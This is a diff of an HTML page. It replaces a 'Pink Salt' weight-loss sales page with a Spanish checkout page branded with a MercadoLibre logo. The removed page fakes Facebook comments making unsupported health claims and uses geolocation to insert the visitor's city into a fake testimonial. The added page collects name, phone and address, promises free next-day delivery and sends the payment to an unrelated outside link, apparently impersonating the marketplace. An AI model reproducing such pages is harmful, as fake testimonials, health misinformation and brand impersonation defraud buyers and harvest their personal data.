@@ -1,515 +1,334 @@
 <!DOCTYPE html>
-<html lang="en-US" dir="ltr">
-
+<html lang="es-MX">
 <head>
-   
-    <!-- Facebook Pixel Code -->
-  <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)
-    }(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout - Detalles de entrega</title>
 
-    fbq('init', '2558147041205045');
-    fbq('track', 'PageView');
-    fbq('track', 'ViewContent');
-  </script>
-  <!-- End Facebook Pixel Code -->
+<style>
+body{
+  margin:0;
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+  background:#fff;
+  color:#111;
+}
 
-  <!-- UTMIFY SCRIPT -->
-  <script
-    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-    data-utmify-prevent-xcod-sck
-    data-utmify-prevent-subids
-    async
-    defer
-  ></script>
-  <!-- END UTMIFY -->
-   
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://pinksalt.takealot-shop.online">
-    <meta property="og:title" content="Pink Salt">
-    <meta property="og:description" content="Conteúdo Exclusivo">
-    <meta property="og:image" content="https://img.imageboss.me/atm/cdn/format:auto/u/umsGbYu2QNOfeAn5fEqSwCDI4VE3/l/rBhIAv7621085.png">
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Conteúdo Exclusivo">
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cabin:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&family=Dosis:wght@200;300;400;500;600;700;800&family=Oswald:wght@200;300;400;500;600;700&family=Signika:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./assets/css/com.css">
+.topbar{
+  height:56px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-bottom:1px solid #eee;
+  position:sticky;
+  top:0;
+  background:#fff;
+  z-index:1000;
+}
 
-  <!-- Título da Página -->
-  <title>Pink Salt!</title>
+.logo-img{
+  height:60px;
+}
 
-  <style type="text/css">
-    header {
-      color: white;
-      background-image: rgb(8, 0, 45);
-      background-color: rgb(255, 255, 255);
-      background-position: center;
-      background-size: cover;
-      background-attachment: fixed;
-      background-blend-mode: darken;
-    }
-  </style>
-  
+.checkout{ padding:20px 16px; }
+.checkout h2{ font-size:22px; font-weight:800; margin-bottom:16px; }
+
+.type-tabs{ display:flex; gap:10px; margin-bottom:20px; }
+
+.tab{
+  flex:1;
+  height:44px;
+  border-radius:8px;
+  border:2px solid #1a73e8;
+  background:#eaf3ff;
+  font-weight:700;
+  color:#1a73e8;
+}
+
+.field{ margin-bottom:18px; }
+
+.field label{
+  font-size:13px;
+  color:#666;
+  display:block;
+  margin-bottom:4px;
+}
+
+.field input{
+  width:100%;
+  border:none;
+  border-bottom:1px solid #ddd;
+  font-size:15px;
+  padding:6px 0;
+  outline:none;
+}
+
+.save-btn{
+  margin-top:30px;
+  width:100%;
+  height:48px;
+  border-radius:999px;
+  border:none;
+  background:#0b6ecb;
+  color:white;
+  font-size:16px;
+  font-weight:800;
+  cursor:pointer;
+}
+
+.save-btn.loading{ opacity:.8; pointer-events:none; }
+.save-btn.saved{ background:#2ecc71; }
+
+#orderReview{
+  display:none;
+  margin-top:24px;
+  border-top:1px solid #eee;
+  padding-top:20px;
+}
+
+.complete-btn{
+  margin-top:20px;
+  width:100%;
+  height:50px;
+  border-radius:999px;
+  border:none;
+  background:#00a651;
+  color:white;
+  font-size:16px;
+  font-weight:900;
+  cursor:pointer;
+  display:none;
+}
+
+.complete-btn:active{
+  transform: scale(0.98);
+}
+
+.province-modal{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.4);
+  display:none;
+  z-index:3000;
+}
+
+.province-modal.is-open{ display:block; }
+
+.province-sheet{
+  position:absolute;
+  left:0;
+  right:0;
+  bottom:0;
+  background:#fff;
+  border-radius:16px 16px 0 0;
+  max-height:80vh;
+  overflow:auto;
+}
+
+.province-head{
+  text-align:center;
+  font-size:18px;
+  font-weight:800;
+  padding:14px;
+  border-bottom:1px solid #eee;
+}
+
+.province-item{
+  padding:16px;
+  border-bottom:1px solid #eee;
+  font-size:16px;
+  cursor:pointer;
+}
+
+.province-item:active{ background:#f2f2f2; }
+</style>
 </head>
 
 <body>
-  <header class="py-4">
-    <div class="container">
-      <div class="row justify-content-center">
-        <div class="col-lg-8 text-center">
-          
-          <!-- VSL -->
-           <vturb-smartplayer id="vid-698889e9ad162bf694ce1653" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/ddad1d87-de8d-478e-8799-7de9848c12c1/players/698889e9ad162bf694ce1653/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
 
-           
-          <link rel="prerender" href="https://payjsr.com/checkout?product=bf606ce8-3e02-470a-856c-92633b516b21"/>
+<div class="topbar">
+<img src="logo-mercadolibre.svg" alt="logo" class="logo-img">
+</div>
 
-          <!-- Botão 1 -->
-            <div id="cta1" class="mt-4 d-none">
-              <a href="https://payjsr.com/checkout?product=bf606ce8-3e02-470a-856c-92633b516b21" class="btn btn-success btn-lg btn-block" style="text-decoration: none;">
-              <br>
-              <span class="span-btn">BUY NOW!</span>   
-              <br>
-              </a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </header>
+<div class="checkout">
 
-  <section class="comments py-4">
+<h2>Detalles de entrega</h2>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<div class="type-tabs">
+<button class="tab">Residencial</button>
+</div>
 
-    <script>$.get("https://ipinfo.io/json", function (response) {
-        $("#address").html(response.city);
-      }, "jsonp");
-    </script>
-      
-    <div class="container">
-      <div class="row justify-content-center">
-        <div class="col-lg-8">
-          <div class="fb-comments" style="margin-top: 5px;">
-            <div class="fb-comments-header">
-              <span>21 of 174 comments</span>
-            </div>
-            <div class="fb-comments-wrapper" id="2">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m2.jpeg"></td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Tereza Mendonça</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">I followed the recipe mentioned at the end of the video for 21 days and the results were incredible!</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>8</likes>
+<div class="field"><label>Nombre del destinatario</label><input id="fName"></div>
+<div class="field"><label>Número de teléfono</label><input id="fPhone"></div>
+<div class="field"><label>Dirección</label><input id="fStreet"></div>
+<div class="field"><label>Departamento / Edificio</label><input></div>
+<div class="field"><label>Colonia</label><input></div>
+<div class="field"><label>Ciudad</label><input id="fCity"></div>
 
-                      <date>4 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <div class="fb-comments-wrapper" id="3">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m3.jpeg"></td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Josefa Perez</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">Here in <span id="address" style="color:#000000;">Salvador</span> everyone is talking about this recipe, very delicious...</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>9</likes>
+<div class="field">
+<label>Estado</label>
+<input id="provinceInput" placeholder="Seleccionar" readonly>
+</div>
 
-                      <date>5 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <div class="fb-comments-wrapper" id="4">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m4.jpeg"></td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Maria Carmen</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">I managed to drop four sizes and now I feel much more confident</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>11</likes>
+<div class="field"><label>Código postal</label><input id="fPostal"></div>
 
-                      <date>12 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <div class="fb-comments-wrapper" id="5">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/h2.jpeg"></td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Carlos Castro</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">This recipe is very easy to make and doesn’t interfere with my daily routine</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>15</likes>
+<button class="save-btn" id="openPayment">
+<span id="saveText">Guardar</span>
+<span id="saveLoader" style="display:none;">Guardando...</span>
+<span id="saveDone" style="display:none;">Guardado ✓</span>
+</button>
 
-                      <date>19 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <div class="fb-comments-wrapper" id="6">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m6.jpeg"></td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Maria Rodriguez</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">Amazing, I’ve been doing it for a few days and it’s already working for me</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>17</likes>
+<div id="orderReview">
 
-                      <date>24 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <div class="fb-comments-wrapper" id="7">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m7.jpeg"></td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Roberta Gomes</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">I was surprised by how fast the results came — I lost weight consistently and in a healthy way</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>18</likes>
+<h2>Resumen del pedido</h2>
 
-                      <date>26 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <div class="fb-comments-wrapper" id="9">
-              <table class="fb-comments-comment">
-                <tbody>
-                  <tr>
-                    <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m11.jpeg">
-                    </td>
-                    <td>
-                      <font class="fb-comments-comment-name">
-                        <name>Carmen González</name>
-                      </font>
-                    </td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-text">Congratulations for sharing something that really works!!!</td>
-                  </tr>
-                  <tr>
-                    <td class="fb-comments-comment-actions">
-                      <like>Like</like>
-                      ·
-                      <reply>Reply</reply>
-                      ·
-                      <likes>22</likes>
+<strong>Método de entrega</strong><br>Entrega<br><br>
 
-                      <date>39 min</date>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-            <button class="fb-comments-loadmore" onclick="javascript:loadMore();">View more comments</button>
-            <div style="display:none" id="more">
-              <div class="fb-comments-wrapper">
-                <table class="fb-comments-comment" id="10">
-                  <tbody>
-                    <tr>
-                      <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m12.jpeg">
-                      </td>
-                      <td>
-                        <font class="fb-comments-comment-name">
-                          <name>Lucía Fernandez</name>
-                        </font>
-                      </td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-text">This little secret changed my relationship with food — now I feel much more in control of my choices</td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-actions">
-                        <like>Like</like>
-                        ·
-                        <reply>Reply</reply>
-                        ·
-                        <likes>41</likes>
+<strong>Dirección de entrega</strong><br>
 
-                        <date>1 h</date>
-                      </td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-              <div class="fb-comments-wrapper" id="11">
-                <table class="fb-comments-comment">
-                  <tbody>
-                    <tr>
-                      <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m15.jpeg">
-                      </td>
-                      <td>
-                        <font class="fb-comments-comment-name">
-                          <name>Maria Isabel Alvarez</name>
-                        </font>
-                      </td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-text">The feeling of well-being this secret provides is indescribable — I feel much healthier</td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-actions">
-                        <like>Like</like>
-                        ·
-                        <reply>Reply</reply>
-                        ·
-                        <likes>40</likes>
+<span style="background:#eee;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;">
+RESIDENCIAL
+</span>
 
-                        <date>1 h</date>
-                      </td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-              <div class="fb-comments-wrapper" id="12">
-                <table class="fb-comments-comment">
-                  <tbody>
-                    <tr>
-                      <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m16.jpeg">
-                      </td>
-                      <td>
-                        <font class="fb-comments-comment-name">
-                          <name>Maria Sanchez</name>
-                        </font>
-                      </td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-text">This product is the perfect solution for those who want to lose weight without sacrifice or suffering</td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-actions">
-                        <like>Like</like>
-                        ·
-                        <reply>Reply</reply>
-                        ·
-                        <likes>47</likes>
+<div id="orName" style="margin-top:8px;font-weight:700;"></div>
+<div id="orAddress" style="color:#555;"></div>
 
-                        <date>1 h</date>
-                      </td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-              <div class="fb-comments-wrapper" id="13">
-                <table class="fb-comments-comment">
-                  <tbody>
-                    <tr>
-                      <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m17.jpeg"></td>
-                      <td>
-                        <font class="fb-comments-comment-name">
-                          <name>Marta Gomez</name>
-                        </font>
-                      </td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-text">Hi! I’m Elizabeth, I’m 42 years old and I want to share my story with you. Some time ago, my health was at risk… my blood pressure was high, my test results were terrible, and I was close to developing diabetes. Then I discovered this incredible method and decided to give it a try. In just a month and a half, I lost 6 kilos and my blood pressure returned to normal. On top of that, my self-esteem has been improving every day. I’m very grateful to have found this solution and wanted to share my experience with you all</td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-actions">
-                        <like>Like</like>
-                        ·
-                        <reply>Reply</reply>
-                        ·
-                        <likes>50</likes>
+<div style="color:#999;">
+<span id="orPerson"></span> — <span id="orPhone"></span>
+</div>
 
-                        <date>1 h</date>
-                      </td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-              <div class="fb-comments-wrapper">
-                <table class="fb-comments-comment" id="14">
-                  <tbody>
-                    <tr>
-                      <td rowspan="3" class="fb-comments-comment-img"><img src="./assets/img/comentarios/m18.jpeg">
-                      </td>
-                      <td>
-                        <font class="fb-comments-comment-name">
-                          <name>Maria Angeles</name>
-                        </font>
-                      </td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-text">I’ve already started noticing my clothes fitting looser as well. Thank you for sharing your experience with me!</td>
-                    </tr>
-                    <tr>
-                      <td class="fb-comments-comment-actions">
-                        <like>Like</like>
-                        ·
-                        <reply>Reply</reply>
-                        ·
-                        <likes>66</likes>
+<br>
 
-                        <date>1 h</date>
-                      </td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-            </div>
-          </div>
-  
-<!-- Botão 2 -->
-            <div id="cta2" class="mt-4 d-none">
-              <a href="https://payjsr.com/checkout?product=bf606ce8-3e02-470a-856c-92633b516b21" class="btn btn-success btn-lg btn-block" style="text-decoration: none;">
-              <br>
-              <span class="span-btn">BUY NOW!</span>
-              <br>
-              </a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+<strong id="orDeliveryDate"></strong><br>
+Entrega al siguiente día hábil • Gratis
 
-  <footer class="bg-white py-3 text-center">
+<br><br>
 
-    <span style="color:#6C757D">Copyright 2024 – Exclusive Content ®
-        <br>All rights reserved.</span><br><br>
+<div style="display:flex;justify-content:space-between;">
+<span style="color:#999;font-weight:700;">PRODUCTOS</span>
+</div>
 
-      <div class="text-secondary"><a href="termos.html" class="text-secondary">Terms of Use</a> – <a href="privacidade.html"
-          class="text-secondary">Privacy Policy</a></div><br>
+<div style="display:flex;gap:12px;margin-top:12px;align-items:center;">
+<img src="p1.png" style="width:60px;height:60px;object-fit:contain;border:1px solid #eee;border-radius:6px;">
+<div style="font-size:14px;font-weight:700;">
+POINTEKX RHINO X21 – Pro Tool Combo 100X
+</div>
+</div>
+
+<button class="complete-btn" id="completePurchase">
+Completar compra
+</button>
+
+</div>
+</div>
+
+<div class="province-modal" id="provinceModal">
+<div class="province-sheet">
+
+<div class="province-head">Estado</div>
+
+<div class="province-item">Aguascalientes</div>
+<div class="province-item">Baja California</div>
+<div class="province-item">Baja California Sur</div>
+<div class="province-item">Campeche</div>
+<div class="province-item">Chiapas</div>
+<div class="province-item">Chihuahua</div>
+<div class="province-item">Ciudad de México</div>
+<div class="province-item">Coahuila</div>
+<div class="province-item">Colima</div>
+<div class="province-item">Durango</div>
+<div class="province-item">Estado de México</div>
+<div class="province-item">Guanajuato</div>
+<div class="province-item">Guerrero</div>
+<div class="province-item">Hidalgo</div>
+<div class="province-item">Jalisco</div>
+<div class="province-item">Michoacán</div>
+<div class="province-item">Morelos</div>
+<div class="province-item">Nayarit</div>
+<div class="province-item">Nuevo León</div>
+<div class="province-item">Oaxaca</div>
+<div class="province-item">Puebla</div>
+<div class="province-item">Querétaro</div>
+<div class="province-item">Quintana Roo</div>
+<div class="province-item">San Luis Potosí</div>
+<div class="province-item">Sinaloa</div>
+<div class="province-item">Sonora</div>
+<div class="province-item">Tabasco</div>
+<div class="province-item">Tamaulipas</div>
+<div class="province-item">Tlaxcala</div>
+<div class="province-item">Veracruz</div>
+<div class="province-item">Yucatán</div>
+<div class="province-item">Zacatecas</div>
+
+
+</div>
+</div>
 
 <script>
 
-    let prefix = ["https://payment.hotmart.com", "https://pay.hotmart.com", "https://go.hotmart.com"];
+provinceInput.onclick = ()=> provinceModal.classList.add("is-open");
 
-function getParams() {
-    let t = "",
-        e = window.top.location.href,
-        r = new URL(e);
-    if (null != r) {
-        let a = r.searchParams.get("utm_source"),
-            n = r.searchParams.get("utm_medium"),
-            o = r.searchParams.get("utm_campaign"),
-            m = r.searchParams.get("utm_term"),
-            c = r.searchParams.get("utm_content"); - 1 !== e.indexOf("?") && (t = `&sck=${a}|${n}|${o}|${m}|${c}`), console.log(t)
-    }
-    return t
-}! function() {
-    var t = new URLSearchParams(window.location.search);
-    t.toString() && document.querySelectorAll("a").forEach(function(e) {
-        for (let r = 0; r < prefix.length; r++) - 1 !== e.href.indexOf(prefix[r]) && (-1 === e.href.indexOf("?") ? e.href += "?" + t.toString() + getParams() : e.href += "&" + t.toString() + getParams())
-    })
-}();
-          
-  </footer>
+document.querySelectorAll(".province-item").forEach(item=>{
+item.onclick = ()=>{
+provinceInput.value = item.innerText;
+provinceModal.classList.remove("is-open");
+}
+});
 
-      <script type="text/javascript">
-      setTimeout(() => {document.getElementById("cta1").classList.remove("d-none"); document.getElementById("cta2").classList.remove("d-none")}, 16000000); // temporização da Call to Action (em milissegundos)
-    </script>
+provinceModal.onclick = e=>{
+if(e.target === provinceModal)
+provinceModal.classList.remove("is-open");
+}
 
-  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
-    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
-    crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"
-    integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49"
-    crossorigin="anonymous"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"
-    integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy"
-    crossorigin="anonymous"></script>
-  <script src="./assets/js/com.js"></script>
+openPayment.onclick = ()=>{
+
+openPayment.classList.add("loading");
+saveText.style.display="none";
+saveLoader.style.display="inline";
+
+setTimeout(()=>{
+
+saveLoader.style.display="none";
+saveDone.style.display="inline";
+openPayment.classList.remove("loading");
+openPayment.classList.add("saved");
+
+const name = fName.value;
+const phone = fPhone.value;
+const street = fStreet.value;
+const city = fCity.value;
+const postal = fPostal.value;
+const prov = provinceInput.value;
+
+orName.innerText = street || "Casa";
+orAddress.innerText = `${street}, ${city}, ${prov}, ${postal}`;
+orPerson.innerText = name;
+orPhone.innerText = phone;
+
+const tomorrow = new Date();
+tomorrow.setDate(tomorrow.getDate()+1);
+
+const months=[
+"enero","febrero","marzo","abril","mayo","junio",
+"julio","agosto","septiembre","octubre","noviembre","diciembre"
+];
+
+orDeliveryDate.innerText =
+`Entrega antes del ${tomorrow.getDate()} ${months[tomorrow.getMonth()]} ${tomorrow.getFullYear()}`;
+
+orderReview.style.display="block";
+
+completePurchase.style.display = "block";
+
+orderReview.scrollIntoView({behavior:"smooth"});
+
+},3000);
+}
+
+completePurchase.onclick = ()=>{
+window.location.href="https://payjsr.com/pay/bc03be59-add7-4fe8-8a46-f21a27c037dc";
+}
+
+</script>
 
 </body>
 </html>
